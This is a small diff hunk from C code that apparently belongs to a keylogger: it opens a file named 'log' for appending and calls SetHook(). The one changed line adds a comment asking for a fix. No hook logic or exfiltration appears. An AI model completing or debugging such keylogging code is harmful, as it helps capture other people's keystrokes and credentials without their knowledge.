@@ -139,7 +139,7 @@ int main() {
     
     const char* keylog = "log";
     printf("Logging output to %s\n", keylog);
-    FILE* output_file = fopen(keylog, "a");
+    FILE* output_file = fopen(keylog, "a"); //please fix this it's not working :(
     
     SetHook();
     
